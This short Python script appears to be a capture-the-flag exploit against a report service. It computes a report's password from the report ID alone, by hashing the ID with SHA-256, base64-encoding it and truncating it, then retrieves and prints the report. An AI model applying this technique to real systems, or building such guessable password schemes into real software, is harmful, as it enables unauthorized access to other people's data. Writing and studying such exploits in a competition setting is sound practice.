import base64
import hashlib
import logging

from shared import make_conn

# CHANGE THIS
TARGET_REPORT = "fK5xC8piqa4G2aoVW.jkGrffm.YTg_Yl"


c, user, password = make_conn()
report_pass = base64.b64encode(
    bytes.fromhex(hashlib.sha256(TARGET_REPORT.encode()).hexdigest())
)[:30].decode()
logging.info("Calculated report password as %s", report_pass)

c.send_line(f"retrieve {report_pass} {TARGET_REPORT}")
report = c.recv_until("=== Report end ===", False).decode()
print(report)
